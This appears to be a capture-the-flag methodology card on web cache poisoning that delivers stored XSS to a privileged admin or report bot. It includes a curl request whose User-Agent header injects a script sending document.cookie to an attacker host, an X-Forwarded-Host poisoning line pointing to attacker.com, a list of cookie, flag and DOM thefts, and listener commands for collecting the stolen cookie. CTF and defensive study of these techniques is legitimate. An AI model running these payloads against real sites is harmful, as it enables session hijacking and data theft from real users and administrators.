# Browser and bot — the privileged viewer and the stored-content render

The bot surface — how a stored poisoned page reaches a privileged context.

---

## 1. The privileged-viewer model — the bot

```text
an admin/report bot renders a URL you supply (or a stored poisoned
page) — the bot's context is privileged (a session cookie, an internal
route, a flag) — the stored copy's injected content runs in the bot's
context.
```

## 2. The bot's visit — the stored copy's serve

```text
a bot that requests the poisoned URL — the stored copy serves YOUR
injected content to the bot's context — the delivery IS the bot's
visit — a stored-XSS-like render.
```

```bash
# a bot that requests the poisoned URL — the stored copy serves it
# the bot's context is privileged — the injected content runs there
```

## 3. The stored-XSS render — the injected content

```text
an unkeyed reflected input carries a payload — a JS, a redirect — the
stored copy serves it to every requester including the bot — the
injected content runs in the bot's privileged context.
```

```bash
# a reflected payload — stored in the cached page
curl "$BASE/page?cb=<unique>" -H 'User-Agent: <script>fetch("//attacker/?"+document.cookie)</script>'
# the stored copy's page carries the XSS — the bot's render runs it
```

## 4. The bot-triage — is there a bot

```bash
# the bot's surface — a report/visit endpoint
grep -rnoiE 'report|visit|render|bot|admin|preview|url' <src> | head -10
```

```text
a bot exists if the challenge has a report/visit endpoint — the bot
renders a URL you supply — the stored poisoned page IS the supplied URL.
```

## 5. The bot's context — the privileged reach

```text
the bot's context: a session cookie, an internal route, a flag — the
injected content reads it — a document.cookie read, a fetch to an
internal route, a DOM read of the flag.
```

## 6. The stored-XSS-via-cache — the poisoned page's render

```bash
# a stored payload — the cached page's injected content
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: attacker.com'
# the stored copy's links/scripts point to attacker.com — the bot's render fetches attacker.com
```

## 7. The privileged-page deception — the bot's privileged view

```text
an authenticated page cached under a shared URL — the stored copy
serves the privileged content — the bot's request gets the privileged
page — a deception that reaches the bot's context.
```

## 8. The bot's timing — the TTL's window

```text
a short TTL → the deception expires before the bot views it → a
wrong-context case.
a long TTL → the deception persists → the bot's visit gets the
poisoned copy.
a measured TTL → the window for the bot's visit.
```

## 9. The bot's reach — what the injected content can do

```text
a stored XSS in the bot's context:
- document.cookie → the bot's session → a session hijack
- fetch('/flag') → the internal flag → a flag read
- document.body.innerHTML → the rendered content → a DOM read
- a redirect → a different URL → a navigation
```

## 10. The bot's falsifier — a bot that doesn't visit

```text
a poisoned copy + no bot visits → the delivery needs a victim — a
wrong-context case. the stored copy only delivers to a requester —
a URL no bot fetches delivers nothing.
```

## 11. The bot's interplay — the stored-content confusion

```text
the verified card's shape: an injected charset XSS stored in the
cached page — the privileged bot's XSS writes files inside the
container — the chain that reaches the flag.
```

## 12. The bot's delivery — the stored copy's serve

```bash
# the bot requests the poisoned URL — the stored copy serves YOUR content
# the bot's context is privileged — the injected content runs there
# the readback: the bot's action on YOUR listener (a cookie, a fetch)
```

```bash
# the exfil — the bot's cookie on your listener
python3 tools/web/oob_listener.py serve --port 9000
python3 tools/web/oob_listener.py hits --name c1
```
